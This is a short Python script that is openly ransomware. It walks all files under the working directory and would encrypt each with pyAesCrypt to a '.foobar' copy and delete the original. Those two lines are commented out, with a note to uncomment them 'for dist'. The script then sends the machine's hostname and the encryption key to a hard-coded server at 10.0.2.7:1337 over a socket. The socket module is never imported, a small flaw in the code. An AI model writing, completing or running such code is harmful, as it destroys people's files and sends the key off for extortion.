import os
import sys
import pyAesCrypt
import random
import keygen
key = keygen.generate_key()
cwd=os. getcwd()

for root,dirs,files in os.walk(cwd):
     for file in files:
         file_path, file_ext = os.path.splitext(root+'\\'+file)
         
         original = (root+'\\'+file)
         newfile = os.path.join(original+'.foobar')
         if (root+'\\'+file) != sys.argv[0]:
             print("encrypting",original)
             #pyAesCrypt.encryptFile(original,newfile,key)
             #os.remove(original)
             #uncomment above for dist


# send data to server

IP = "10.0.2.7" #server ip
PORT = 1337
hostname = os.getenv("COMPUTERNAME") # Getting the hostname
data = str(hostname)+" key:"+key
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP,PORT))
    print("Connected to",IP,"at port",PORT)
    s.send(data.encode("utf-8"))
    print("Finished transmitting data!")
    s.close()


sys.exit()

